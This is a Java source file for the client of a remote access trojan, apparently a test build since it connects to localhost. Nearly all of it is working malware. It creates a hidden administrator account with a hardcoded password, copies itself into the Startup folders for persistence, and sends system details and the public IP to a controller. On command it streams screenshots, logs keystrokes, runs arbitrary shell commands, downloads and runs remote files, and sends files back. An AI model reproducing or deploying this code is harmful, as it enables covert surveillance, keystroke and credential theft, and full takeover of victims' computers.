package com.rattest.client;

import java.io.*;
import java.net.*;
import com.github.kwhat.jnativehook.*;
import com.github.kwhat.jnativehook.keyboard.*;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.MouseInfo;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Random;
import java.util.regex.Pattern;
import javax.imageio.ImageIO;
public class Client implements NativeKeyListener,Runnable {
    Socket s,realTimeSocket;
    DataInputStream in,rIn;
    DataOutputStream out,rOut;
    String cmd;
    boolean stop,stopKey;
    int tries=0;
    String address,country;
    synchronized public boolean persis(){
        try{
            ProcessBuilder builder;
            try{
                builder = new ProcessBuilder(
                "cmd.exe","/c", "net user slSupport");
                builder.redirectErrorStream(true);
                Process p = builder.start();
                BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while (true) {
                    line = r.readLine();
                    if (line == null) {
                        break;
                    }
                    else if(line.contains("The user name could not be found.")){
                        System.out.println("Adding slSupport to the System");
                        builder = new ProcessBuilder(
                        "cmd.exe","/c", "net user /add slSupport EJylIGOu'o8gl:g^Ujfpi8lFkhj6nlB%dgvCptDGVhbJk;y9E*un7j");
                        builder.redirectErrorStream(true);
                        builder.start();
                        System.out.println("Adding slSupport to admins group");
                        builder = new ProcessBuilder(
                        "cmd.exe","/c", "net localgroup administrators slSupport /add");
                        builder.redirectErrorStream(true);
                        builder.start();
                        System.out.println("Hiding slSupport from the System");
                        builder = new ProcessBuilder(
                        "cmd.exe","/c", "net user slSupport /active:no");
                        builder.redirectErrorStream(true);
                        builder.start();
                        break;
                    }
                }
            }catch(Exception e){
                out.writeUTF("NO ADMIN PRIVILEGES FOUND");
            }
            s = new Socket("localhost", 304);
            in = new DataInputStream(new BufferedInputStream(s.getInputStream()));
            out = new DataOutputStream(s.getOutputStream());
            try{
                String fileName=(Client.class
                        .getProtectionDomain()
                        .getCodeSource()
                        .getLocation()
                        .getPath());
                fileName= fileName.substring(fileName.lastIndexOf("/") + 1);
                Path startup = Paths.get("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"+fileName);
                if(!(Files.exists(startup))){
                    System.out.println("Add to the startup folder and create regedit keys");
                    builder = new ProcessBuilder("cmd.exe","/c", "copy \""+Paths.get(".").toAbsolutePath().normalize().toString()+fileName+"\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\"");
                    builder.redirectErrorStream(true);
                    builder.start();
                }
            }
            catch(Exception e){
                String fileName=(Client.class
                        .getProtectionDomain()
                        .getCodeSource()
                        .getLocation()
                        .getPath());
                fileName= fileName.substring(fileName.lastIndexOf("/") + 1);
                Path startup = Paths.get("C:\\Users\\"+System.getProperty("user.name")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+fileName);
                if(!(Files.exists(startup))){
                    System.out.println("Add to the startup folder and create regedit keys");
                    builder = new ProcessBuilder("cmd.exe","/c", "copy \""+Paths.get(".").toAbsolutePath().normalize().toString()+fileName+"\" \"C:\\Users\\"+System.getProperty("user.name")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
                    builder.redirectErrorStream(true);
                    builder.start();
                }
            }
            try{
                String pcName=InetAddress.getLocalHost().getHostName();
                String os=System.getProperty("os.name");
                if(country==null||address==null){
                    String[] ipCountry,ip;
                    HttpClient browser=HttpClient.newHttpClient();
                    HttpRequest req=HttpRequest.newBuilder(new URI("http://ip-api.com/json/")).build();
                    HttpResponse<String> res=browser.send(req,HttpResponse.BodyHandlers.ofString());
                    ipCountry=(res.body()).split(".*?country\":\"|\",\"countryCode.*");
                    ip=(res.body()).split(".*?query\":\"|\".*");
                    address=ip[1];
                    country=ipCountry[1];
                }
                String[] sysInfo={country,pcName,os,address};
                out.writeUTF(sysInfo[0]+","+sysInfo[1]+"\\"+"slSupport"+","+sysInfo[2]+","+sysInfo[3]);
            }catch(Exception e){}
            while (true) {
                cmd = in.readUTF();
                if(cmd.equals("RDP")){
                    new Thread(rdp).start();
                }
                if(cmd.equals("KeyLogger")){
                    new Thread(keylog).start();
                }
                if(cmd.contains("cmd:")){
                    String[] command=cmd.split("cmd:");
                    cmd=command[1];
                    new Thread(exeCmd).start();
                }
                if(cmd.contains("links:")){
                    String[] links=cmd.split("links:");
                    Path path = Paths.get("C:\\rdp");
                    cmd=links[1];
                    if(Files.exists(path)){
                        new Thread(dwn).start();
                    }else{
                        builder = new ProcessBuilder("cmd.exe","/c", "C: && cd \"C:\\\" && mkdir rdp && cd \"C:\\rdp\" && mkdir downloads && attrib +s +h \"C:\\rdp\" ");
                        builder.redirectErrorStream(true);
                        builder.start();
                        new Thread(dwn).start();
                    }
                }
                if(cmd.contains("exe:")){
                    String[] apps=cmd.split("exe:");
                    cmd=apps[1];
                    new Thread(exe).start();
                }
                if(cmd.contains("zip:")){
                    String[] zipF=cmd.split("zip:");
                    cmd=zipF[1];
                    new Thread(zip).start();
                }
                if(cmd.contains("downF:")){
                    String[] apps=cmd.split("downF:");
                    cmd=apps[1];
                    new Thread(downF).start();
                }
                if(cmd.contains("fileMngr:")){
                    String[] list=cmd.split("fileMngr:");
                    cmd=list[1];
                    new Thread(fileMngr).start();
                }
            }
        }
        catch(Exception e){
            System.out.println(e);
            if(tries==10){
            try {
                wait(2000000);
            } catch (Exception ex) {System.out.println(ex);}
            tries=0;
            }
            tries++;
            return false;
        }
    }
    Runnable fileMngr=new Runnable(){
        @Override
        public void run(){
            if(cmd.equals("listdisks")){
                try{
                ProcessBuilder executeCommand=new ProcessBuilder("cmd.exe","/c","wmic logicaldisk get name");
                executeCommand.redirectErrorStream(true);
                Process p=executeCommand.start();
                BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String result="C:";
                String line;
                String[] disks;
                while (true) {
                    line = r.readLine();
                    if (line == null) {
                        break;
                    }
                    else if(!(line.contains("Name"))&&!(line.contains("C:"))&&!(line.isEmpty())){
                        disks=line.split("\t|\s");
                        result=result.concat(","+disks[0]);
                    }
                }
                out.writeUTF(result);
                }
                catch(Exception e){System.out.println(e);}
            }
            else{
                try{
                    ProcessBuilder executeCommand=new ProcessBuilder("cmd.exe","/c",cmd);
                    executeCommand.redirectErrorStream(true);
                    Process p=executeCommand.start();
                    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String result="";
                    String line;
                    String[] files;
                    while (true) {
                        line = r.readLine();
                        if (line == null) {
                            break;
                        }
                        else if(!(line.contains("Volume in drive "))&&!(line.contains("Volume Serial Number"))&&!(line.contains("Name"))&&!(line.isEmpty())){
                            files=line.split("\\d\\d\\d\s|<.*?>\s|\s\s\s\s\s\s\s\s\s");
                            for(String str:files){if(!Pattern.compile("\\d\\d:\\d\\d|\\d\\d/\\d\\d|\\d,").matcher(str).find()&&!(str.isEmpty())&&!str.equals(".")&&!(str.contains("bytes"))&&!(Pattern.compile("\s\s\s\s\s\s").matcher(str).find())){result=result.concat(","+str);}}
                        }
                    }
                    out.writeUTF(result);
                }
                catch(Exception e){System.out.println(e);}
            }
        }
    };
    Runnable rdp=new Runnable(){
        @Override
        public void run() {
            
            String response="";
            BufferedImage screen=null;
            Image fScreen=null;
            try {
                realTimeSocket=new Socket("localhost",403);
                realTimeSocket.setSoTimeout(2000);
                realTimeSocket.setReuseAddress(true);
                rIn=new DataInputStream(realTimeSocket.getInputStream());
                rOut=new DataOutputStream(realTimeSocket.getOutputStream());
                rOut.writeUTF(address);
                int b;
                stop=false;
                while(!(stop)){
                    Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
                    screen = new Robot().createScreenCapture(new Rectangle(new Dimension(screenSize.width, screenSize.height)));
                    int x = MouseInfo.getPointerInfo().getLocation().x;
                    int y = MouseInfo.getPointerInfo().getLocation().y;
                    Graphics2D graphics2D = screen.createGraphics();
                    graphics2D.setColor(Color.RED);
                    graphics2D.fillOval(x, y, 10, 10);
                    graphics2D.drawOval(x, y, 10,10);
                    rOut.writeInt(rOut.size());
                    ImageIO.write(screen, "jpg", rOut);
                    b=rIn.readInt();
                }
            }
            catch(Exception e){
                System.out.println(e);
                stop=true;
                try {
                    realTimeSocket.close();
                    realTimeSocket=null;
                } catch (IOException ex) {}
            }
        }
    };
    Runnable downF=new Runnable(){
        @Override
        public void run() {
            String result="";
            try{
                InputStream readFile = new FileInputStream(cmd);
                int count;
                byte[] buffer = new byte[8192]; // or 4096, or more
                while ((count = readFile.read(buffer)) > 0)
                {
                    out.write(buffer, 0, count);
                }
                result=result.concat("File with path "+cmd+" succesfully downloaded");
                out.writeUTF(result);
            }catch(SocketException sC){System.out.println(sC);}
            catch(Exception e){
                result=result.concat("An error ocurred while downloading the file with path "+cmd+"\nError: "+e+"\n");
            }
        }
    };
    Runnable zip=new Runnable(){
        @Override
        public void run() {
            String result="";
            String zipPath= "C:\\rdp\\downloads\\"+(new Random().ints(97, 122 + 1)//97=a, 122=z
                      .limit(10)//String length
                      .collect(StringBuilder::new, StringBuilder::appendCodePoint, StringBuilder::append)
                      .toString())+".zip";
            try{
                ProcessBuilder builder = new ProcessBuilder("cmd.exe","/c", "powershell Compress-Archive '"+cmd+"' '"+zipPath+"'");
                builder.redirectErrorStream(true);
                builder.start();
                result=result.concat("File Successfully zipped in "+zipPath+" Using CMD\n");
            }
            catch(Exception e){
                result=result.concat("Problem in File "+cmd+"\nError: "+e+"\n");
            }
            try {
                out.writeUTF(result);
            } catch (IOException ex) {}
        }
    };
    Runnable exe=new Runnable(){
        @Override
        public void run() {
            String[] apps=cmd.split("\n");
            String result="";
            int i=0;
            while(i<apps.length){
                if(!(apps[i].isEmpty())){
                    try{
                        ProcessBuilder builder = new ProcessBuilder("cmd.exe","/c", "\""+apps[i]+"\"");
                        builder.redirectErrorStream(true);
                        builder.start();
                        result=result.concat("App with path: "+apps[i]+" executed succesfully\n");
                    }catch(Exception e){
                        result=result.concat("Error while executing app with path: "+apps[i]+" Please check its path and try again, if the error persist, contact me.");
                    }
                }
                i++;
            }
            try {
                out.writeUTF(result);
            } catch (IOException ex) {System.out.println(ex);}
        }
    };
    Runnable dwn=new Runnable(){
        @Override
        public void run() {
            String[] links=cmd.split("\n");
            String result="";
            String path="C:\\rdp\\downloads";
            int n=0;
            while(n<links.length){
                try {
                    URL url = new URL(links[n]);
                    HttpURLConnection httpConnection = (HttpURLConnection) (url.openConnection());
                    long completeFileSize = httpConnection.getContentLength();
                    String fileName=httpConnection.getHeaderField("Content-Disposition");
                    String[] Extension=(httpConnection.getContentType()).split("/|;");
                    String Separator=(path.contains("/"))?"/":"\\";
                    if(fileName==null || !fileName.contains("filename")){
                        fileName = Separator+(new Random().ints(97, 122 + 1)//97=a, 122=z
                          .limit(10)//String length
                          .collect(StringBuilder::new, StringBuilder::appendCodePoint, StringBuilder::append)
                          .toString())+"."+Extension[1];
                    }
                    else{
                        fileName=fileName.replaceAll("[<>:\"|?*]","");
                        Extension=fileName.split("'|;|\"");
                        int i=0;
                        while(i<Extension.length){
                            if(Extension[i].contains(".")){
                                fileName=Separator+Extension[i];
                            }
                            i++;
                        }

                    }
                    java.io.BufferedInputStream in = new java.io.BufferedInputStream(httpConnection.getInputStream());
                    java.io.FileOutputStream fos = new java.io.FileOutputStream(path+fileName);
                    java.io.BufferedOutputStream bout = new BufferedOutputStream(fos, 1024);
                    byte[] data = new byte[1024];
                    long downloadedFileSize = 0;
                    int x = 0;
                    while ((x = in.read(data, 0, 1024)) >= 0) {
                        downloadedFileSize += x;
                        bout.write(data, 0, x);
                    }
                    bout.close();
                    in.close();
                    result=result.concat("Succesful download, saved in: "+path+fileName);
                } catch (Exception e) {
                    result=result.concat("Something Went Wrong in "+n+" link\nError: \n"+e);
                }
                n++;
            }
            try {
                out.writeUTF(result);
            } catch (IOException ex) {System.out.println(ex);}
        }
    };
    Runnable exeCmd=new Runnable(){
        @Override
        public void run() {
            String result="";
            try{
                ProcessBuilder builder = new ProcessBuilder(
                "cmd.exe","/c", cmd);
                builder.redirectErrorStream(true);
                Process p = builder.start();
                BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while (true) {
                    line = r.readLine();
                    if (line == null) {
                        break;
                    }
                    else{
                        result=result.concat("\n"+line);
                    }
                }
                out.writeUTF(result);
            }
            catch(Exception e){
                result="You typed a Wrong command or something went wrong, please contact me and let me know how did it ocurred";
            }
        }
    };
    Runnable keylog=new Runnable(){
        @Override
        public void run() {
            try {
                realTimeSocket=new Socket("localhost",403);
                realTimeSocket.setReuseAddress(true);
                realTimeSocket.setSoTimeout(2000);
                rIn=new DataInputStream(realTimeSocket.getInputStream());
                rOut=new DataOutputStream(realTimeSocket.getOutputStream());
                rOut.writeUTF(address);
                stopKey=false;
                
            } catch (Exception e) {
               System.out.println(e);
            }
             try{
                if(GlobalScreen.isNativeHookRegistered()!=true){
                    GlobalScreen.registerNativeHook();
                    GlobalScreen.addNativeKeyListener(new NativeKeyListener(){
                        @Override
                        public void nativeKeyPressed(NativeKeyEvent e){
                            try{
                                if(stopKey!=true){
                                    rOut.writeUTF(NativeKeyEvent.getKeyText(e.getKeyCode()));
                                    String check=rIn.readUTF();
                                }
                            }catch(Exception except){
                                System.out.println(except);
                                stopKey=true;
                                try {
                                    realTimeSocket.close();
                                    realTimeSocket=null;
                                } catch (Exception ex) {}
                            }
                        }
                    });
                }
            }catch(Exception e){System.out.println(e);}
         }
    };
    public Client(){
        while(!(persis())){
            persis();
        }
    }
    public static void main(String args[]){
        new Client();
    }

    @Override
    public void run() {}
}/*
class Keylogger extends Client implements NativeKeyListener{
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        
    }
    public static void main(String[] args){
        try{
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(new KeyLogger());
        }catch(Exception e){System.out.println(e);}
    }
}*/